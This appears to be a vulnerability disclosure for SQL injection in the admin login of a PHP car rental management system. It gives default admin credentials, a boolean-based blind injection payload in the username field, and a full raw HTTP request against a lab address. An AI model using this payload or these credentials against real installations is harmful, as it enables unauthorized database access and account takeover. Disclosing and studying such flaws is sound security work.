# Car Rental Management System v1.0 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.campcodes.com/projects/php/car-rental-management-system/

Vulnerability File: /ip/car-rental-management-system/admin/ajax.php?action=login

Vulnerability location: ip/car-rental-management-system/admin/ajax.php?action=login,username

[+] Payload: username=admin' and length(database())=13--+&password=admin // Leak place ---> username

Current database name: car_rental_db,length is 13

```sql
POST http://192.168.1.19/car-rental-management-system/admin/ajax.php?action=login HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/car-rental-management-system/admin/login.php
Content-Length: 59
Cookie: PHPSESSID=q0aiu0hqk51vrl4kivubc7u18k
Connection: close

username=admin' and length(database())=13--+&password=admin
```

1 is successful login, 3 is unable to log in

![image](https://user-images.githubusercontent.com/54017627/170958555-53b9508d-8f13-40b8-a219-1d8448b87a5d.png)

![image](https://user-images.githubusercontent.com/54017627/170958588-c6a71a00-a326-413f-a866-32ae579fa8b8.png)
